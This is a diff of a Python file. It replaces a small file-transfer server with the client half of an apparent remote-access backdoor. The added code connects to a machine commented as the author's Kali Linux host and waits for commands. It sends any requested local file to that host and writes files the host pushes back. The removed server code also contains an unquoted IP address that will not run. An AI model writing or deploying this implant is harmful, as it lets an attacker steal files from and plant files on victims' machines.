@@ -1,60 +1,59 @@
-import os
 import socket
+import json
+import os
 
-HOST = 0.0.0.0
-PORT = 12345
+SERVER_IP = '10.0.1.37'  # IP of my Kali Linux machine
+SERVER_PORT = 5555
 
-def handle_upload(connection, server_destination):
-    file_name = connection.recv(1024).decode()
-    file_size = int(connection.recv(1024).decode())
+def reliable_send(data):
+    json_data = json.dumps(data)
+    target_sock.send(json_data.encode())
 
-    with open(os.path.join(server_destination, file_name), 'wb') as f:
-        remaining = file_size
-        while remaining:
-            data = connection.recv(min(1024, remaining))
-            if not data:
-                break
-            f.write(data)
-            remaining -= len(data)
-    print(f"File {file_name} uploaded to {server_destination}.")
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target_sock.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
 
-def handle_download(connection, server_destination):
-    file_name = connection.recv(1024).decode()
-    file_path = os.path.join(server_destination, file_name)
+def upload_file(filename):
+    file = open(filename, 'rb')
+    target_sock.send(file.read())
+    file.close()
 
-    if not os.path.exists(file_path):
-        connection.send(b"ERROR: File not found!")
-        return
+def download_file(filename, destination):
+    if destination:
+        filepath = os.path.join(destination, os.path.basename(filename))
+    else:
+        filepath = filename
+    file = open(filepath, 'wb')
+    target_sock.settimeout(1)
+    chunk = target_sock.recv(1024)
+    while chunk:
+        file.write(chunk)
+        try:
+            chunk = target_sock.recv(1024)
+        except socket.timeout:
+            break
+    target_sock.settimeout(None)
+    file.close()
 
-    file_size = os.path.getsize(file_path)
-    connection.send(str(file_size).encode())
+def shell():
+    while True:
+        command = reliable_recv()
+        if command[:9] == 'download ':
+            upload_file(command[9:])
+        elif command[:7] == 'upload ':
+            args = command[7:].split(' -d ')
+            filename = args[0]
+            destination = args[1] if len(args) > 1 else None
+            download_file(filename, destination)
+        else:
+            break
 
-    with open(file_path, 'rb') as f:
-        while (data := f.read(1024)):
-            connection.send(data)
-    print(f"File {file_name} sent to client.")
-
-def main():
-    server_destination = 'downloads'
-    os.makedirs(server_destination, exist_ok=True)
-
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((HOST, PORT))
-        s.listen(5)
-        print(f"Server listening on {HOST}:{PORT}...")
-
-        while True:
-            conn, addr = s.accept()
-            print(f"Connected by {addr}")
-            command = conn.recv(1024).decode()
-
-            if command.startswith("upload"):
-                handle_upload(conn, server_destination)
-            elif command.startswith("download"):
-                handle_download(conn, server_destination)
-            else:
-                print(f"Unknown command: {command}")
-            conn.close()
-
-if __name__ == "__main__":
-    main()
+target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+target_sock.connect((SERVER_IP, SERVER_PORT))
+shell()
+target_sock.close()
